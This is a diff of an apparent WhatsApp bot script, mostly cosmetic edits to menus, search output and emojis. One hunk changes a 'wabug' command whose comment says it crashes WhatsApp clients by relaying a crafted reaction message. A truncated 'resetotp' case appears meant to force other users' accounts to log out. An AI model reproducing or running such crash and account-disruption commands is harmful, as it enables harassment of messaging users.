@@ -1486,7 +1486,7 @@ XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my h
 break
 case 'list': case 'menu': {
 	        let ownernya = ownernomer + '@s.whatsapp.net'
-            let me = m.react('👻')
+            let me = m.sender
             let timestampe = speed()
             let latensie = speed() - timestampe
             xeonezy = `
@@ -3312,7 +3312,7 @@ case 'yts': case 'ytsearch': {
                 let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                 let no = 1
                 for (let i of search.all) {
-                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
+                    teks += `${themeemoji} 𝘕𝘖 : ${no++}\n${themeemoji} 𝘛𝘠𝘗𝘌 : ${i.type}\n${themeemoji} 𝘝𝘐𝘋𝘌𝘖 𝘐𝘋 : ${i.videoId}\n${themeemoji} 𝘛𝘐𝘛𝘓𝘌 : ${i.title}\n${themeemoji} 𝘝𝘐𝘌𝘞𝘚 : ${i.views}\n${themeemoji} 𝘋𝘜𝘙𝘈𝘛𝘐𝘖𝘕 : ${i.timestamp}\n${themeemoji} 𝘜𝘗𝘓𝘖𝘈𝘋𝘌𝘋 : ${i.ago}\n${themeemoji} 𝘜𝘙𝘓 : ${i.url}\n\n─────────────────\n\n`
                 }
                 XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
@@ -6614,18 +6614,18 @@ thumbnailUrl: thumb,
 }
 }
 break
-case 'xbugr':{ //crashes both mod and playstore wa
+case 'wabug':{ //crashes both mod and playstore wa
 if (!XeonTheCreator) return XeonStickOwner()
 const { xeonorwot } = require('./XBug/xeonbut2')
 let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
-XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
+XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🐼' })
 }
 break
 case "resetotp": {
 if (Input) {
 let cekno = await XeonBotInc.onWhatsApp(Input)
 if (cekno.length == 0) return replygcxeon(`The participant is no longer registered on WhatsApp`)
-if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't logout My Owner🦄!`)
+if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't logout My Owner🐼!`)
 var targetnya = m.sender.split('@')[0]
 try {
 var axioss = require('axios')
